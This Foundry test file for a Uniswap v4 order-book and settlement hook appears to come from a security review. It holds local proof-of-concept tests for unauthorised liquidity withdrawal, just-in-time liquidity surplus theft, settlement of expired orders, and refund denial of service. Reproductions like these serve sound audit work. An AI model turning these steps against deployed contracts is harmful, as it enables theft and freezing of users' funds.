// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// Review reproductions: PASS means the documented unsafe behavior exists.
// Local tests only; no deployment or production contract changes.
import {OtterSettlementTest, IERC20Minimal} from "./OtterSettlement.t.sol";
import {OtterOrderBookTest} from "./OtterOrderBook.t.sol";
import {OtterOrderBook} from "../src/OtterOrderBook.sol";
import {OtterSettlement} from "../src/OtterSettlement.sol";
import {OtterMath} from "../src/OtterMath.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolIdLibrary, PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";

contract GrantReviewSettlementTest is OtterSettlementTest {
    using PoolIdLibrary for *;
    using StateLibrary for IPoolManager;

    function test_review_UnauthorizedRouterWithdrawal() public {
        address attacker = address(0xBAD);
        assertEq(IERC20Minimal(Currency.unwrap(currency0)).balanceOf(attacker), 0);
        vm.prank(attacker);
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: -int256(1e21), salt: 0
        }), ZERO_BYTES);
        assertGt(IERC20Minimal(Currency.unwrap(currency0)).balanceOf(attacker), 999e18);
        assertGt(IERC20Minimal(Currency.unwrap(currency1)).balanceOf(attacker), 999e18);
        assertEq(manager.getLiquidity(otterId), 0);
    }

    function test_review_ExpiredOrderCanStillSettle() public {
        OtterOrderBook.Order[] memory os = new OtterOrderBook.Order[](2);
        bytes[] memory sigs = new bytes[](2);
        (os[0],) = _order(dom, domPk, true, DOM_BUDGET, 0);
        (os[1],) = _order(min, minPk, false, MIN_BUDGET, 0);
        os[0].deadline = block.timestamp + 1;
        os[1].deadline = block.timestamp + 1;
        for (uint256 i; i < 2; i++) {
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(i == 0 ? domPk : minPk, book.digestOf(os[i]));
            sigs[i] = abi.encodePacked(r, s, v);
        }
        uint256 id = book.submit(os, sigs);
        vm.warp(block.timestamp + 1 days);
        settlement.settle(otterKey, id, os, _outcome(_curve(), 1e15));
        assertGt(IERC20Minimal(Currency.unwrap(currency1)).balanceOf(dom), 0);
    }

    function test_review_SolverCanPayAskAndCaptureSurplusAsLP() public {
        OtterOrderBook.Order[] memory os = new OtterOrderBook.Order[](1);
        bytes[] memory sigs = new bytes[](1);
        (os[0],) = _order(dom, domPk, true, DOM_BUDGET, 0);
        os[0].ask = 1e17;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(domPk, book.digestOf(os[0]));
        sigs[0] = abi.encodePacked(r, s, v);
        uint256 id = book.submit(os, sigs);
        vm.warp(block.timestamp + WINDOW + 300);
        uint256[] memory y = new uint256[](1);
        uint256[] memory x = new uint256[](1);
        y[0] = DOM_BUDGET;
        x[0] = 1e18;
        settlement.settle(otterKey, id, os, OtterSettlement.Outcome(true, y, x));
        assertEq(IERC20Minimal(Currency.unwrap(currency1)).balanceOf(dom), 1e18);
        uint256 pot = settlement.pendingSurplus(otterId, currency1);
        assertGt(pot, 8e18);
        settlement.flushSurplus(otterKey);
        uint256 before = IERC20Minimal(Currency.unwrap(currency1)).balanceOf(address(this));
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: 0, salt: 0
        }), ZERO_BYTES);
        uint256 collected = IERC20Minimal(Currency.unwrap(currency1)).balanceOf(address(this)) - before;
        assertApproxEqAbs(collected, pot, 2);
    }

    function test_review_ExtremeAskPoisonsClassification() public {
        OtterOrderBook.Order[] memory os = new OtterOrderBook.Order[](2);
        bytes[] memory sigs = new bytes[](2);
        (os[0], sigs[0]) = _order(dom, domPk, true, DOM_BUDGET, 0);
        (os[1],) = _order(min, minPk, false, 1, 0);
        os[1].ask = type(uint256).max;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(minPk, book.digestOf(os[1]));
        sigs[1] = abi.encodePacked(r, s, v);
        uint256 id = book.submit(os, sigs);
        vm.warp(block.timestamp + WINDOW);
        uint256[] memory y = new uint256[](2);
        uint256[] memory x = new uint256[](2);
        y[0] = DOM_BUDGET;
        x[0] = 9e18;
        vm.expectRevert();
        settlement.settle(otterKey, id, os, OtterSettlement.Outcome(true, y, x));
        (, , bool spent) = book.batches(PoolId.unwrap(otterId), id);
        assertFalse(spent);
    }

    function test_review_MinorityCanReceiveZeroBelowItsAsk() public {
        (otterKey, otterId) = initPool(currency0, currency1, IHooks(address(hook)), 0, 2, SQRT_PRICE_1_1 * 2);
        settlement.registerPool(otterKey);
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: 1e21, salt: 0
        }), ZERO_BYTES);
        OtterOrderBook.Order[] memory os = new OtterOrderBook.Order[](2);
        bytes[] memory sigs = new bytes[](2);
        (os[0], sigs[0]) = _order(dom, domPk, true, DOM_BUDGET, 0);
        (os[1],) = _order(min, minPk, false, 1, 0);
        os[1].ask = 25e16;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(minPk, book.digestOf(os[1]));
        sigs[1] = abi.encodePacked(r, s, v);
        uint256 id = book.submit(os, sigs);
        vm.warp(block.timestamp + WINDOW);
        uint256[] memory y = new uint256[](2);
        uint256[] memory x = new uint256[](2);
        y[1] = 1;
        settlement.settle(otterKey, id, os, OtterSettlement.Outcome(true, y, x));
        assertEq(IERC20Minimal(Currency.unwrap(currency0)).balanceOf(min), 0);
        assertEq(settlement.pendingSurplus(otterId, currency1), 1);
    }

    function test_review_ProtocolFeeBreaksModelOutcome() public {
        (uint256 id, OtterOrderBook.Order[] memory os) = _openBatch();
        OtterSettlement.Outcome memory outcome = _outcome(_curve(), 0);
        manager.setProtocolFeeController(address(this));
        manager.setProtocolFee(otterKey, uint24(1000 | (1000 << 12)));
        vm.expectPartialRevert(OtterSettlement.PoolOutputShortfall.selector);
        settlement.settle(otterKey, id, os, outcome);
    }

    function test_review_JitLPCollectsPreviousTradersSurplus() public {
        (uint256 id, OtterOrderBook.Order[] memory os) = _openBatch();
        settlement.settle(otterKey, id, os, _outcome(_curve(), 1e15));
        uint256 pot = settlement.pendingSurplus(otterId, currency1);
        address attacker = address(0xBADE);
        _fund(currency0, attacker, 20000e18);
        _fund(currency1, attacker, 20000e18);
        vm.startPrank(attacker);
        IERC20Minimal(Currency.unwrap(currency0)).approve(address(modifyLiquidityRouter), type(uint256).max);
        IERC20Minimal(Currency.unwrap(currency1)).approve(address(modifyLiquidityRouter), type(uint256).max);
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: 9e21, salt: bytes32(uint256(1))
        }), ZERO_BYTES);
        settlement.flushSurplus(otterKey);
        uint256 before = IERC20Minimal(Currency.unwrap(currency1)).balanceOf(attacker);
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: 0, salt: bytes32(uint256(1))
        }), ZERO_BYTES);
        uint256 reward = IERC20Minimal(Currency.unwrap(currency1)).balanceOf(attacker) - before;
        assertApproxEqAbs(reward, pot * 9 / 10, 2);
        modifyLiquidityRouter.modifyLiquidity(otterKey, IPoolManager.ModifyLiquidityParams({
            tickLower: TICK_LOWER, tickUpper: TICK_UPPER, liquidityDelta: -int256(9e21), salt: bytes32(uint256(1))
        }), ZERO_BYTES);
        vm.stopPrank();
    }
}

contract GrantReviewRefundTest is OtterOrderBookTest {
    function test_review_OneBlockedRecipientPreventsAllRefunds() public {
        (uint256 id, OtterOrderBook.Order[] memory os) = _submitTwo();
        vm.warp(block.timestamp + WINDOW + REFUND_DELAY);
        vm.mockCall(address(currency1), abi.encodeWithSelector(currency1.transfer.selector, bob, os[1].budget), abi.encode(false));
        uint256 aliceBefore = currency0.balanceOf(alice);
        vm.expectRevert(OtterOrderBook.TransferFailed.selector);
        book.refundExpired(POOL, id, os);
        assertEq(currency0.balanceOf(alice), aliceBefore);
        (, , bool spent) = book.batches(POOL, id);
        assertFalse(spent);
    }

    function test_review_UnboundedBatchExceedsRefundGasBudget() public {
        uint256 n = 1800;
        OtterOrderBook.Order[] memory all = new OtterOrderBook.Order[](n);
        // Independent submit calls model submissions accumulated over a window.
        for (uint256 start; start < n; start += 100) {
            OtterOrderBook.Order[] memory os = new OtterOrderBook.Order[](100);
            bytes[] memory sigs = new bytes[](100);
            for (uint256 j; j < 100; j++) {
                uint256 pk = 100000 + start + j;
                address trader = vm.addr(pk);
                currency0.mint(trader, 1);
                vm.prank(trader);
                currency0.approve(address(book), 1);
                os[j] = _order(trader, 0, true);
                os[j].budget = 1;
                sigs[j] = _sign(pk, os[j]);
                all[start + j] = os[j];
            }
            book.submit(os, sigs);
        }
        vm.warp(block.timestamp + WINDOW + REFUND_DELAY);
        (bool ok,) = address(book).call{gas: 30_000_000}(
            abi.encodeCall(book.refundExpired, (POOL, 0, all))
        );
        assertFalse(ok, "atomic refund must exceed the example 30M gas budget");
        (, uint32 count, bool spent) = book.batches(POOL, 0);
        assertEq(count, n);
        assertFalse(spent);
        // The same committed batch is refundable with an artificial larger budget.
        book.refundExpired{gas: 80_000_000}(POOL, 0, all);
        (, , spent) = book.batches(POOL, 0);
        assertTrue(spent);
    }
}
